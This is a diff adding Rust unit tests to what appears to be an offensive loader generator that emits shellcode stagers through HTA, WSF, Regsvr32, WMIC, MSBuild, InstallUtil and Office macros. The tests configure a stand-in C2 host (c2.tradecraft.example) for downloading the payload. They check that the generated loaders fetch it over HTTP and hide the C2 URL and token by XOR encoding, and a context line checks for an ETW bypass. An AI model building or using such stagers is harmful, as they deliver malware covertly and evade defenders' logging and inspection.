@@ -16,6 +16,43 @@ fn base_config(t: LoaderType) -> LoaderConfig {
     }
 }
 
+fn staged_config(t: LoaderType) -> LoaderConfig {
+    LoaderConfig {
+        loader_type: t,
+        features: vec![],
+        encryption: Encryption::Aes256,
+        shellcode_hex: "00".into(),
+        key_hex: "00".repeat(32),
+        iv_hex:  "00".repeat(16),
+        pe_config: None,
+        appdomain_config: if t == LoaderType::AppDomain {
+            Some(AppDomainConfig {
+                clr_version:   "v4.0.30319".into(),
+                net_version:   "4.0".into(),
+                assembly_name: "x".into(),
+                type_name:     "y".into(),
+                namespace:     "z".into(),
+            })
+        } else { None },
+        wsf_stub_config: if matches!(t, LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
+            Some(WsfStubConfig { namespace: "x".into(), type_name: "y".into() })
+        } else { None },
+        dotnet_stub_hex: None,
+        staged: Some(StagedConfig {
+            url:        "https://c2.tradecraft.example/api/v1/stage/aabbccddeeff0011".into(),
+            jwt:        "HEADER.PAYLOAD.SIGNATURE".into(),
+            user_agent: "Mozilla/5.0 Windows".into(),
+        }),
+    }
+}
+
+fn assert_no_plaintext_staged_secrets(src: &str, label: &str) {
+    assert!(!src.contains("c2.tradecraft.example"),
+        "{}: staged URL host must be XOR-encoded, not plaintext", label);
+    assert!(!src.contains("HEADER.PAYLOAD.SIGNATURE"),
+        "{}: staged JWT must be XOR-encoded, not plaintext", label);
+}
+
 // ── Script: WSF ──────────────────────────────────────────────────────────────
 
 #[test]
@@ -370,4 +407,72 @@ fn csharp_installutil_has_etw_bypass() {
     let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
     assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("new int[]"),
         "InstallUtil must have ETW bypass");
+}
+
+// ── Staged-mode tests ─────────────────────────────────────────────────────────
+
+#[test]
+fn wsf_staged_uses_xmlhttp() {
+    let src = generate_script_source(&staged_config(LoaderType::Wsf)).unwrap();
+    assert!(src.contains("responseBody"), "WSF staged must read responseBody from XMLHTTP");
+    assert_no_plaintext_staged_secrets(&src, "WSF");
+}
+
+#[test]
+fn sct_staged_uses_xmlhttp() {
+    let src = generate_script_source(&staged_config(LoaderType::Regsvr32Sct)).unwrap();
+    assert!(src.contains("responseBody"), "SCT staged must read responseBody from XMLHTTP");
+    assert_no_plaintext_staged_secrets(&src, "SCT");
+}
+
+#[test]
+fn wmic_staged_uses_xmlhttp() {
+    let src = generate_script_source(&staged_config(LoaderType::WmicXsl)).unwrap();
+    assert!(src.contains("responseBody"), "WMIC staged must read responseBody from XMLHTTP");
+    assert_no_plaintext_staged_secrets(&src, "WMIC");
+}
+
+#[test]
+fn hta_staged_uses_winhttp() {
+    let src = generate_script_source(&staged_config(LoaderType::Hta)).unwrap();
+    assert!(src.contains("responseBody"), "HTA staged must read responseBody from WinHttp");
+    assert_no_plaintext_staged_secrets(&src, "HTA");
+}
+
+#[test]
+fn msbuild_staged_uses_httpwebrequest() {
+    let src = generate_script_source(&staged_config(LoaderType::MsBuild)).unwrap();
+    assert!(src.contains("HttpWebRequest"),
+        "MSBuild staged must use HttpWebRequest");
+    assert_no_plaintext_staged_secrets(&src, "MSBuild");
+}
+
+#[test]
+fn installutil_staged_uses_httpwebrequest() {
+    let src = generate_csharp_source(&staged_config(LoaderType::InstallUtil)).unwrap();
+    assert!(src.contains("HttpWebRequest"),
+        "InstallUtil staged must use HttpWebRequest");
+    assert_no_plaintext_staged_secrets(&src, "InstallUtil");
+}
+
+#[test]
+fn appdomain_staged_uses_httpwebrequest() {
+    let src = generate_csharp_source(&staged_config(LoaderType::AppDomain)).unwrap();
+    assert!(src.contains("HttpWebRequest"),
+        "AppDomain staged must use HttpWebRequest");
+    assert_no_plaintext_staged_secrets(&src, "AppDomain");
+}
+
+#[test]
+fn vba_word_staged_uses_winhttp() {
+    let src = generate_vba_source(&staged_config(LoaderType::DocxMacro)).unwrap();
+    assert!(src.contains("responseBody"), "VBA Word staged must read responseBody");
+    assert_no_plaintext_staged_secrets(&src, "VBA Word");
+}
+
+#[test]
+fn vba_excel_staged_uses_winhttp() {
+    let src = generate_vba_source(&staged_config(LoaderType::XlsxMacro)).unwrap();
+    assert!(src.contains("responseBody"), "VBA Excel staged must read responseBody");
+    assert_no_plaintext_staged_secrets(&src, "VBA Excel");
 }
